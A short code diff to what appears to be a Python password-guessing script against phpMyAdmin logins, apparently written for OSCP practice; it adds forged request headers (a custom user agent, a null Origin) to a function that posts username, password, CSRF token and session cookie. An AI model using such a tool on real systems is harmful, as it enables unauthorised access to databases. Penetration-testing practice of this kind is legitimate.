@@ -49,8 +49,14 @@ def forge_post(url, token, cookie, username, password):
     '''
 
 
+    headers = {
+        "User-Agent" : "iamjonny the tester",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "null",
+        "Upgrade-Insecure-Requests": 1
+    }
+
     cookie = {
-        "User-Agent" : "OSCP_tester",
         "phpMyAdmin":cookie
     }
 
@@ -66,7 +72,7 @@ def forge_post(url, token, cookie, username, password):
     }
 
 
-    resp = requests.post(url, data=payload, cookies=cookie)
+    resp = requests.post(url, headers = headers, data=payload, cookies=cookie)
 
     return resp
 
@@ -104,7 +110,7 @@ def analyze_resp(resp):
     return (next_cookie, token, password_correct)
 
 
-###########################################MAIN#############################################
+###########################################   MAIN   #############################################
 
 def main():
 
